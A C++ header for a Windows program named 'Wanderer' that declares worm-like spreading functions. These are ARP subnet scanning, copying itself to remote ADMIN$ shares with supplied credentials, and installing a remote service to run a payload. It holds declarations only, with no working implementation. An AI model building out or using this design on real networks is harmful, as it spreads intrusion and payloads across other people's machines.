#ifndef __WANDERER_H_
#define __WANDERER_H_

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include "Utils.h"

using namespace std;

#pragma comment(lib, "Ws2_32.lib") //for WinSock
#pragma comment(lib, "Mpr.lib") //for Net share stuff

#define SERVICE_NAME L"Wanderer"
#define SERVICE_FLAG "-service"
#define DEST_FILENAME "Wanderer.exe"
#define USERNAME_FLAG "-u"
#define PASSWORD_FLAG "-p"
#define PAYLOAD_FLAG "-e"
#define INSTALL_LOCATION "%SystemRoot%\\"
#define SHARE_PATH L"\\ADMIN$"

#define MAX_THREADS 64
#define SLEEP_MIN 60000
#define SLEEP_MAX 3600000 //An hour In millseconds

typedef struct options{
	bool isService;
	char* username;
	char* password;
	char* origPath;
	char* payloadPath;
}opt;

extern options cmdOpts;
extern Log logFile;

int wandererMain();
bool InstallAndStartRemoteService(std::wstring remoteServer,std::wstring serviceName,std::string payloadName);
WCHAR* ipToSharePath(char* ip);
std::wstring createDestFileName(WCHAR* orig,const char* filePath);
void getIpsToScan(networkInfo );
void startArpScan(std::vector<char*>);
void first_octet(int i, int mask);
void second_octet(int ip0,int i,int mask);
void third_octet(int ip0,int ip1,int i,int mask);
void fourth_octet(int ip0, int ip1, int ip2, int i, int mask);

//thread safe
DWORD WINAPI aprscan(char*);

#endif
